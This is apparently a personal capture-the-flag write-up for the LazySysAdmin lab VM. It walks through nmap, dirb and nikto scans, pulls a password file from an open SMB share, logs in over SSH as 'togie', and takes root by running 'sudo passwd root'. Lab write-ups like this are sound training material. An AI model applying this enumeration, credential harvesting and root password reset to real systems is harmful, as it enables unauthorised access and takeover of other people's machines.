## LazySysAdmin

* * *

**Finding the IP** \- `sudo arp-scan 10.0.0.0/24`

![Optional Text](/LazyAdminWriteUp/_resources/5ecc1faea08d4ab6a1fd728b732c4f0f.png)

**Attempting SSH**.......... gotta try :)

![Optional Text](/LazyAdminWriteUp/_resources/e3e174550b2a424ea903e366252fbab3.png)

* * *

## Nmap

- `nmap -sC -sV -oA nmapscans/lazyadmin 10.0.0.144`

**nmap scan results**

```
Starting Nmap 7.80 ( https://nmap.org ) at 2021-03-22 09:03 EDT
Nmap scan report for 10.0.0.144
Host is up (0.0018s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 b5:38:66:0f:a1:ee:cd:41:69:3b:82:cf:ad:a1:f7:13 (DSA)
|   2048 58:5a:63:69:d0:da:dd:51:cc:c1:6e:00:fd:7e:61:d0 (RSA)
|   256 61:30:f3:55:1a:0d:de:c8:6a:59:5b:c9:9c:b4:92:04 (ECDSA)
|_  256 1f:65:c0:dd:15:e6:e4:21:f2:c1:9b:a3:b6:55:a0:45 (ED25519)
80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))
|_http-generator: Silex v2.2.7
| http-robots.txt: 4 disallowed entries 
|_/old/ /test/ /TR2/ /Backnode_files/
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Backnode
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3306/tcp open  mysql       MySQL (unauthorized)
6667/tcp open  irc         InspIRCd
| irc-info: 
|   server: Admin.local
|   users: 1
|   servers: 1
|   chans: 0
|   lusers: 1
|   lservers: 0
|   source ident: nmap
|   source host: 10.0.0.186
|_  error: Closing link: (nmap@10.0.0.186) [Client exited]
Service Info: Hosts: LAZYSYSADMIN, Admin.local; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -3h20m00s, deviation: 5h46m24s, median: 0s
|_nbstat: NetBIOS name: LAZYSYSADMIN, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: lazysysadmin
|   NetBIOS computer name: LAZYSYSADMIN\x00
|   Domain name: \x00
|   FQDN: lazysysadmin
|_  System time: 2021-03-22T23:04:01+10:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-03-22T13:04:01
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.56 seconds
```

* * *

`Note`
*from the nmap output alone, I see several avenues of interest but I decided to continue with enumerating the box*

* * *

## Dirb and Nikto
* * *
### dirb
- `dirb http://10.0.0.144:80/ /home/doxg/Downloads/wordlist/dirb-kali-master/wordlists/common.txt`

 The dirb scan found many directories to investigate, but the output was pretty large so I will just provide a sample below, you can also run the command yourself to see.

```
 Scanning URL: http://10.0.0.144:80/ ----
==> DIRECTORY: http://10.0.0.144:80/apache/                                                                                                     
+ http://10.0.0.144:80/index.html (CODE:200|SIZE:36072)                                                                                         
+ http://10.0.0.144:80/info.php (CODE:200|SIZE:77224)                                                                                           
==> DIRECTORY: http://10.0.0.144:80/javascript/                                                                                                 
==> DIRECTORY: http://10.0.0.144:80/old/                                                                                                        
==> DIRECTORY: http://10.0.0.144:80/phpmyadmin/                                                                                                 
+ http://10.0.0.144:80/robots.txt (CODE:200|SIZE:92)                                                                                            
+ http://10.0.0.144:80/server-status (CODE:403|SIZE:290)                                                                                        
==> DIRECTORY: http://10.0.0.144:80/test/                                                                                                       
==> DIRECTORY: http://10.0.0.144:80/wordpress/                                                                                                  
==> DIRECTORY: http://10.0.0.144:80/wp/                                    
---- Entering directory: http://10.0.0.144:80/apache/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                               
---- Entering directory: http://10.0.0.144:80/javascript/ ----
==> DIRECTORY: http://10.0.0.144:80/javascript/jquery/                                                                                         
---- Entering directory: http://10.0.0.144:80/old/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                              
---- Entering directory: http://10.0.0.144:80/phpmyadmin/ ----
```

### Nikto
* * *
- `nikto -h 10.0.0.144:80`

![Optional Text](/LazyAdminWriteUp/_resources/0e535510a0dd4264af4ee3ee69972d0c.png)

- `Note`
*After the Nikto and Dirb scans I see several directories of interest. I brefiely check them out but wanted to continue.* 

**Marked a few to revist**
```
- http://10.0.0.144/test/
- http://10.0.0.144/old/
- http://10.0.0.144/phpmyadmin/
- http://10.0.0.144/wordpress/
```
Found a **username** on the "/wordpress/" page **"togie"**
![Optional Text](/LazyAdminWriteUp/_resources/0ecc4e0304c44381a4e9e3c653ee1295.png)

## SMB
* * *
- `nmap --script smb-os-discovery 10.0.0.144`
* * *

![Optional Text](/LazyAdminWriteUp/_resources/6aa4e3672c074ee3ac93972e6f01510c.png)

**List Shares**
- `smbclient -L 10.0.0.144`
![Optional Text](/LazyAdminWriteUp/_resources/0409d251197f42db86eda3ec2a935ce7.png)

**Connect to Share**
- `smbclient //10.0.0.144/share$`
- `login prompt provide creds`
- `ls`
![Optional Text](/LazyAdminWriteUp/_resources/7af5b1184b60448c859a9be36fef8a12.png)

**Grab Files**
- `get todolist.txt`
- `get deets.txt`


**Read Files**
- `cat deets.txt`

![Optional Text](/LazyAdminWriteUp/_resources/d13749b4bd9c4ef68e7099e3e563559a.png)
* * *

## Login Attempt
* * *
At this point the **wordpress** page gave us the username **togie** and the deets.txt file, gave us the password **12345**


![Optional Text](/LazyAdminWriteUp/_resources/23ecdf608af24b709560e0d00c352d44.png)



* * *
### SSH Attempt

With **togie** and **12345** SSH Login was succesful!

![Optional Text](/LazyAdminWriteUp/_resources/edc9eed3210c4d2d9032a31b4daca8da.png)

I tried to run a **"sudo -l"** and was succesful. This confirmed I could run sudo.
![Optional Text](/LazyAdminWriteUp/_resources/cdeaa59cdd0a4dcdac5bdab2de488036.png)

**Change the root password and login as root**
Now that I know I can run sudo. I figured why not try to change the root password

- `sudo passwd root`
    
- `su root`

Now I am logged on as root I run "ls" and see a proof.txt file

-  `ls`
    
- `cat proof.txt`
    
![Optional Text](/LazyAdminWriteUp/_resources/d67193cf5c8c4618ac5ea26d010e0573.png)

## All Done!
